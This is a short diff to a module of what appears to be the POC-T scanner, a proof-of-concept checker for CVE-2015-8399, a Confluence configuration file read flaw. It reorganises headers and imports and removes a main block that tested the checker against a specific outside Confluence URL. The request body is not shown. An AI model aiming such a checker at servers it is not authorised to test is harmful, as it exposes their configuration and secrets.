@@ -1,11 +1,9 @@
-# coding:utf8
-__author__ = 'xy'
+# !/usr/bin/env python
+# -*- coding: utf-8 -*-
+# author = i@cdxy.me
+# project = https://github.com/Xyntax/POC-T
 
-import requests
-
-from util.urlparser import iterate_path
-
-infostr = """
+"""
 Atlassian Confluence config file read POC [CVE-2015-8399]
 
 reference:
@@ -13,19 +11,12 @@ http://zone.wooyun.org/content/27104
 http://www.cnnvd.org.cn/vulnerability/show/cv_id/2016010311
 https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-8399
 
-cdxy  May 7 Sat, 2016
-
-usage:python POC-T.py -T -m confluence-file-read -f [path/targetfile] -t [thread-num]
-
+usage:
+python POC-T.py -T -m confluence-file-read -f [path/targetfile] -t [thread-num]
 """
 
-
-def info():
-    return infostr
-
-
-def exp():
-    pass
+import requests
+from util.urlparser import iterate_path
 
 
 def poc(_inp):
@@ -38,8 +29,3 @@ def poc(_inp):
         return False
     except Exception, e:
         return False
-
-
-if __name__ == '__main__':
-    print info()
-    print poc('http://confluence.unlimax.com/ffeac')
